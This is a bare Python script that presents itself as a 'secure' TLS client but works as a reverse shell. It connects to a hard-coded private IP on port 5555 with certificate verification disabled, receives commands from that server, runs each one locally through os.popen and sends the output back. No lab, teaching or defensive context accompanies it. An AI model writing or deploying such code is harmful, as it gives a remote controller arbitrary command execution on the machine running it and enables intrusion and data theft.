import socket
import ssl
import os

FORMAT = 'UTF-8'
DISCONNECT_MESSAGE = "!DISCONNECT"

# Server details
ADDR = ('172.20.132.160', 5555)

# Create a socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Create SSL context
context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
# For self-signed certificates, disable hostname verification
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE


def connect_secure():
    """
    Establish a secure TLS connection to the server
    """
    try:
        # Wrap the socket with SSL
        secure_client = context.wrap_socket(client, server_hostname=ADDR[0])
        secure_client.connect(ADDR)
        print("CONNECTED SECURELY")
        return secure_client
    except Exception as e:
        print(f"Secure connection failed: {e}")
        return None


def send(conn, msg):
    """
    Send a command to the server and get response
    """
    try:
        # Execute command locally and send output
        response = os.popen(msg).read()
        conn.send(response.encode(FORMAT))
    except Exception as e:
        print(f"Error sending message: {e}")
        return "ERROR, TRY AGAIN!"


def main():
    # Establish secure connection
    secure_conn = connect_secure()
    if not secure_conn:
        return

    while True:
        try:
            # Receive command from server
            comand = secure_conn.recv(2048).decode(FORMAT)

            # Send command output back to server
            send(secure_conn, comand)
        except Exception as e:
            print(f"Connection error: {e}")
            break


if __name__ == "__main__":
    main()